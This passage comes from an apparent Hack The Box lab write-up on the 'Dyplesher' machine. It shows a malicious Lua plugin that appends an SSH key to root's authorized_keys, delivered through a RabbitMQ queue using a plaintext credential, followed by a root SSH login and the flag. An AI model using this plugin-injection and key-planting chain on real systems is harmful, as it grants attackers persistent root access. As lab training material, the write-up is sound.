</pre></td><td class="rouge-code"><pre>felamos@dyplesher:/tmp<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
<span class="nt">-rw-r--r--</span>  1 root     root        0 Oct 29 19:41 cfx
</pre></td></tr></tbody></table></code></pre></div></div>

<h3 id="malicious-plugin---rce">Malicious Plugin - RCE</h3>

<p>Now, that we have confirmed that our code execution is working, letâ€™s drop our SSH key to <code class="language-plaintext highlighter-rouge">/root/.ssh/authorized_keys</code> and get a root shell</p>

<h4 id="cfxlua-script">cfx.lua Script:</h4>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>felamos@dyplesher:/dev/shm<span class="nv">$ </span><span class="nb">cat </span>cfx.lua
os.execute<span class="o">(</span><span class="s2">"echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDtC3xSsz34olQ4a0fk6x+IqUvSCbsXE6jiM2AMyA8rY+kLoG3ekOTrToramikOd174buxFYF5hpB0jVMN2URAVchcTL1VKpqdm0jssG5nsT69IWMyaOQ8RHb6Ew4pO77y3n1y43DRd1H2HQuZPSZyOpaewROc8F7LPIVXG4h5DMFT0ZL+MYNWD6IuNxBjfrgyz2WVskvXKwSRmq6L6kcwe+1a7XOrwkrpqzoPngtg9T9WP55rXt9Hzm+yDjYFO4VbE2R+L0vCg5UUZOXnjYBniot9w/jZyyOUuqjPG3/vldAtD11t9dbc89ZtOXT7GIzZEjYbCcul3HXhV4JY3SqvAkYB58imYnt8NsLSl2AwTjiIh7VFu6BIHLvNiEjwpMAxkMSj5cXjj2JcCHhGEPRxemRQmC9Wz9PzDEercJJwtQMCAf5vRE+VZnrwIhBHPznQ+7WVQJklI7ywbh9ljc5ZOz0Ba/RAi5AI8w7Lb2QjSP1po21TsBMgNXmhta0F3f+s= root@cfx' &gt;&gt; /root/.ssh/authorized_keys"</span><span class="o">)</span>

felamos@dyplesher:/dev/shm<span class="nv">$ </span>python3 <span class="nt">-m</span> http.server 8020
Serving HTTP on 0.0.0.0 port 8020 <span class="o">(</span>http://0.0.0.0:8020/<span class="o">)</span> ...
127.0.0.1 - - <span class="o">[</span>29/Oct/2020 19:52:11] <span class="s2">"GET /cfx.lua HTTP/1.0"</span> 200 -
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Publishing :</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/dyplesher
â†’ ./amqp-publish.linux-amd64 <span class="nt">--uri</span><span class="o">=</span><span class="s2">"amqp://yuntao:EashAnicOc3Op@10.10.10.190:5672/"</span> <span class="nt">--exchange</span><span class="o">=</span><span class="s2">""</span> <span class="nt">--routing-key</span><span class="o">=</span><span class="s2">"plugin_data"</span> <span class="nt">--body</span><span class="o">=</span><span class="s2">"http://127.0.0.1:8020/cfx.lua"</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<h3 id="shell-as-root">Shell as root</h3>

<h4 id="ssh-access">SSH access</h4>

<p>Since, Our public key was written inside the home directory of root user, we can SSH as root using the Private key:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/dyplesher
â†’ ssh <span class="nt">-i</span> coldfx root@10.10.10.190
Welcome to Ubuntu 19.10 <span class="o">(</span>GNU/Linux 5.3.0-46-generic x86_64<span class="o">)</span>

 <span class="k">*</span> Documentation:  https://help.ubuntu.com
 <span class="k">*</span> Management:     https://landscape.canonical.com
 <span class="k">*</span> Support:        https://ubuntu.com/advantage

  System information as of Thu 29 Oct 2020 07:52:39 PM UTC

  System load:  0.0               Processes:              239
  Usage of /:   6.7% of 97.93GB   Users logged <span class="k">in</span>:        1
  Memory usage: 35%               IP address <span class="k">for </span>ens33:   10.10.10.190
  Swap usage:   0%                IP address <span class="k">for </span>docker0: 172.17.0.1


57 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list <span class="nt">--upgradable</span>

Failed to connect to https://changelogs.ubuntu.com/meta-release. Check your Internet connection or proxy settings


Last login: Sun May 24 03:33:34 2020
root@dyplesher:~# <span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<h4 id="grabbing-roottxt">Grabbing root.txt</h4>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>root@dyplesher:~# <span class="nb">cat </span>root.txt
f1f06c6366971dc<span class="k">*****************</span>

</pre></td></tr></tbody></table></code></pre></div></div>
<p>And we pwned the Box !</p>

<p>Thanks for reading, Suggestions &amp; Feedback are appreciated !</p>
:ET